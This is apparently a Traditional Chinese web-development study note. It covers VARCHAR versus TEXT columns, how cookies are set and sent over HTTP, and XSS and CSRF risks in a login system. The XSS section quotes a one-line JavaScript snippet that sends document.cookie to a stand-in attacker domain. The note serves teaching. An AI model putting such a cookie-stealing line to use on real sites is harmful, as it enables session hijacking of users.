## 資料庫欄位型態 VARCHAR 跟 TEXT 的差別是什麼

varchar :可以設定最大長度，適合用在文字量少的欄位，可以有預設值。

text : 不可設定長度，適合用在文字量多的欄位，最大长度为 2 ^ 31 - 1 個字符，不可以有預設值。

* varchar 查询速度更快，所以能用 varchar 的时候就不用 text。
* 查詢速度：char 最快， varchar 次之，text 最慢。

>[參考資料](https://hsiangfeng.github.io/php/20190904/1799668484/) 從基礎學習 ThinkPHP-基礎 MySQL 學習-資料表篇

>[參考資料](https://ithelp.ithome.com.tw/articles/10203456?sc=iThelpR) 常用的資料庫資料型態

>[參考資料](http://n.sfs.tw/content/index/10266) [Mysql] 資料型態


## Cookie 是什麼？在 HTTP 這一層要怎麼設定 Cookie，瀏覽器又是怎麼把 Cookie 帶去 Server 的？

### Cookie 是什麼？
* Cookie是一種讓網路瀏覽更流暢方便的機制。使用Cookie能夠免去每次都要對經常存取的會員網站輸入登入資訊的麻煩，也更容易搜尋到自己需要的資訊。
* Cookie可以分成第一方（First-party）Cookie以及第三方（Third-party）Cookie等兩種。
* 第一方Cookie: 由使用者存取網站隸屬的網域，第一方Cookie不可以跨網域使用，主要用在記錄限定於該存取網站之內的瀏覽紀錄等資訊、保持登入狀態等用途。
* 第三方Cookie: 由不屬於使用者存取網站隸屬的網域所發行的Cookie，會跨網域獲取使用者的瀏覽紀錄資訊，並用來發布該使用者可能關注的廣告。

>[參考資料](https://blog.trendmicro.com.tw/?p=63387) 什麼是 Cookie？如何管理Cookie，防範網路隱私外洩?

### 在 HTTP 這一層要怎麼設定 Cookie ?
HTTP的無狀態性，伺服器並不知道使用者在每個頁面跳轉時到底帶入了什麼資訊，而Cookie就是用來繞開HTTP的無狀態性的「額外手段」之一，讓伺服器可以設定或讀取Cookies中所包含資訊，藉此維護使用者在使用服務時，在背景完成並可以持續跟伺服器發送請求以及對談中的狀態。

登入的應用為例，就是使用者登入一個網站時，伺服器端往往會請求用戶輸入使用者帳號及密碼，並且用戶可以勾選「下次自動登入」，這就是觸發使用Cookie的開關了，如果勾選了，在使用者前一次登入時，伺服器就會傳送了包含登入憑據（使用者名稱加密碼的某種加密形式）的Cookie到使用者的硬碟(或記憶體上)，在之後登入時，只要Cookie尚未到期，瀏覽器會傳送該Cookie給伺服器作驗證憑據，來減少重複登入的輸入行為。

Server 可以在 HTTP response 中回傳 Set-Cookie header 來告訴瀏覽器要設定 cookie。設定的語法如下：

```
Set-Cookie: [cookie名稱]=[cookie值]
```
Request 中的 cookie header 會是 [cookie名稱]=[cookie值] 的形式，用分號串接之後的結果：

``` 
Cookie: [cookie1]=[value1]; [cookie2]=[value2]
```
瀏覽器看到 Set-Cookie header 便會將 cookie 儲存起來，之後對同一個 domain 發送 HTTP request 的時候，瀏覽器就會將 cookie 帶在 HTTP request 的 Cookie header 裡。

Cookie属性除了name（名）和value（值）之外，還有以下四種可選擇的属性，來控制cookie的保存期限，作用網域及安全性：

1. expires: 表示Cookie的保存期限，在默認的情況下為暫時性的cookie，只要關閉瀏覽器就會消失

2. path: 指定與cookie關連在一起的網頁，默認的狀況下為和當前網頁同一目錄的網頁中有效。

3. domain: 設定cookie有效的網域名稱，可以和path一同設定，讓相同/類似的domain可以享有同樣的cookie

4. secure:算是cookie的安全值，在默認的情況cookie的傳輸上是不安全的，可以通過一個不安全且一般的http，若設置為安全的狀況下，可以讓cookie只在安全的http上進行傳輸

>[參考資料](https://shubo.io/cookies/)  Cookie 與 document.cookie

#### 瀏覽器又是怎麼把 Cookie 帶去 Server 的？
Cookie 是儲存在瀏覽器的一小段文字資料，通常由伺服器透過 Set-Cookie header 傳遞給瀏覽器。瀏覽器收到後會將 cookie 儲存起來，並在之後的請求回傳 cookie 至同樣的伺服器。
收到一個 HTTP 請求時，伺服器可以傳送一個 Set-Cookie 的標頭和回應。Cookie 通常存於瀏覽器中，並隨著請求被放在Cookie HTTP 標頭內，傳給同個伺服器。可以註明 Cookie 的有效或終止時間，超過後 Cookie 將不再發送。此外，也可以限制 Cookie 不傳送到特定的網域或路徑。

>[參考資料](https://progressbar.tw/posts/91) Cookie 是文檔還是餅乾？簡述HTTP網頁紀錄會員資訊的一大功臣。

>[參考資料](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Cookies) HTTP cookies


## 我們本週實作的會員系統，你能夠想到什麼潛在的問題嗎？

機密或敏感的資訊不應該以 HTTP Cookies 的方式儲存或傳送，因為整個機制的本質是不安全的。

如果 JavaScript 能夠存取這個 cookie 就有受到 XSS Attack (Cross-Site Scripting，跨站腳本攻擊) 的風險。

什麼是 XSS Attack (跨站腳本攻擊) 呢？簡單的說，就是將一段惡意的 JavaScript 程式碼透過表單等方式上傳到 server，之後這份表單資料在前端呈現的時候惡意的 JavaScript 程式碼會被當成是 HTML 的一部分被執行。假設壞人能夠執行 JavaScript，便能很輕易地存取 document.cookie，就能夠竊取你用來登入的 cookie，並且用你的身份做惡意的操作：

``` js
// 把你的 cookie 送到壞人的伺服器
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

另外一個潛在問題是 CSRF （Cross Site Request Forgery），是一種 Web 上的攻擊手法。
在不同的 domain 底下卻能夠偽造出「使用者本人發出的 request」。CSRF 攻擊之所以能成立，是因為使用者在被攻擊的網頁是處於已經登入的狀態，所以才能做出一些行為。

>[參考資料](https://blog.techbridge.cc/2017/02/25/csrf-introduction/) 讓我們來談談 CSRF
 
 >[參考資料](https://shubo.io/cookies/) Cookie 與 document.cookie
